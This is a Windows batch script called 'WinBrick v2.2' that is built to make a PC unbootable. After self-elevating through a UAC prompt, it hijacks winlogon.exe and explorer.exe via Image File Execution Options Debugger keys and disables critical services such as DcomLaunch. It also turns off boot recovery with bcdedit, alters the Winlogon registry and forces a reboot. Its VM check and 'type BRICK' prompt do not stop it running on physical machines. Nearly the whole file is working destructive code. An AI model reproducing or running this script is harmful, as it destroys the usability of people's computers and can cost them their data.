@echo off
mode con: cols=100 lines=30
title WinBrick v2.2 - BRICK SEQUENCE FIXED
color 0C
chcp 65001 >nul

:: ================================
:: WINBRICK v2.2 - BRICK CRASH FIXED
:: Author: gabriled
:: ================================

:: AUTO ELEVATION
net session >nul 2>&1
if %errorlevel%==0 (
    goto :admin_confirmed
) else (
    echo [i] Requesting admin privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs" >nul 2>&1
    exit /b
)

:admin_confirmed
cls
echo.
echo   .  .    .__        .  
echo  ^|  ^|*._ [__)._.* _.;_/
echo  ^|/\^|^|[ ^)[__^)[  ^|^(_.^| \                 
echo.
echo WINBRICK v2.2 - BRICK SEQUENCE FIXED
echo [✓] Admin privileges CONFIRMED
echo.

:: VM CHECK
echo [i] Environment scan...
systeminfo | find "VMware" >nul 2>&1
if %errorlevel%==0 (
    echo [✓] VM detected - SAFE
    set "VMSTATUS=VM"
) else (
    echo [!] Physical PC - DANGER
    set "VMSTATUS=PHYSICAL"
)
echo.

:: CONFIRMATION
echo.
echo ⚠️  CRITICAL WARNING ⚠️
echo Target: %COMPUTERNAME% [%VMSTATUS%]
echo Type BRICK to DESTROY:
set /p input=
if /i "%input%"=="BRICK" goto :brick_start else (
    echo [✗] Aborted safely.
    timeout /t 3 >nul
    exit /b
)

:brick_start
cls
echo.
echo   .  .    .__        .  
echo  ^|  ^|*._ [__)._.* _.;_/
echo  ^|/\^|^|[ ^)[__^)[  ^|^(_.^| \                 
echo.
echo 🔥 🔥 🔥 BRICK SEQUENCE STARTED 🔥 🔥 🔥
echo.

:: BRICK 1 - WINLOGON (FIXED SYNTAX)
echo [1/5] 🔒 Winlogon.exe...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f >nul 2>&1
if %errorlevel%==0 (echo [✓] Winlogon BRICKED) else (echo [✗] Winlogon FAILED)
timeout /t 1 >nul

:: BRICK 2 - EXPLORER (FIXED SYNTAX)
echo [2/5] 🖥️  Explorer.exe...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f >nul 2>&1
if %errorlevel%==0 (echo [✓] Explorer BRICKED) else (echo [✗] Explorer FAILED)
timeout /t 1 >nul

:: BRICK 3 - SERVICES (FIXED SYNTAX)
echo [3/5] ⚙️  Critical Services...
sc config themes start=disabled >nul 2>&1
sc config uxsms start=disabled >nul 2>&1
sc config DcomLaunch start=disabled >nul 2>&1
echo [✓] Services DISABLED
timeout /t 1 >nul

:: BRICK 4 - BOOT (FIXED BCD SYNTAX)
echo [4/5] 💾 Boot Configuration...
bcdedit /set "{default}" recoveryenabled No >nul 2>&1
bcdedit /set "{default}" bootstatuspolicy DisplayAllFailures >nul 2>&1
echo [✓] Boot CORRUPTED
timeout /t 1 >nul

:: BRICK 5 - REGISTRY + SHELL (FIXED)
echo [5/5] 🗄️  Registry ^+ Shell...
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v WinBrick_v2.2 /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f >nul 2>&1
echo [✓] Registry ^+ Shell CORRUPTED
timeout /t 1 >nul

echo.
echo 🔥 🔥 🔥 100%% BRICK COMPLETE 🔥 🔥 🔥
echo.

:: LOG
echo %date% %time% - WinBrick v2.2 SUCCESS ^| %COMPUTERNAME% ^| %VMSTATUS% >> "%temp%\winbrick.log" 2>nul

:: SUCCESS SCREEN
cls
echo.
echo   .  .    .__        .  
echo  ^|  ^|*._ [__)._.* _.;_/
echo  ^|/\^|^|[ ^)[__^)[  ^|^(_.^| \                 
echo.
echo ════════════════════════════════════════════════════════════════
echo        💀 WINBRICK v2.2 - BRICK SUCCESSFUL 💀
echo ════════════════════════════════════════════════════════════════
echo.
echo 🔥 SYSTEM DESTROYED - REBOOT IN 10 SECONDS 🔥
echo 📝 Log: %temp%\winbrick.log
echo.

:: COUNTDOWN
for /l %%i in (10,-1,1) do (
    echo   ⏰ %%i seconds until BRICK...
    timeout /t 1 >nul 2>&1
)

:: FINAL REBOOT
cls
echo.
echo   .  .    .__        .  
echo  ^|  ^|*._ [__)._.* _.;_/
echo  ^|/\^|^|[ ^)[__^)[  ^|^(_.^| \                 
echo.
echo 💀 REBOOTING - SYSTEM BRICKED 💀
timeout /t 2 >nul

shutdown /r /f /t 5

:: HOLD
:hold
ping -n 6 127.0.0.1 >nul 2>&1
goto :hold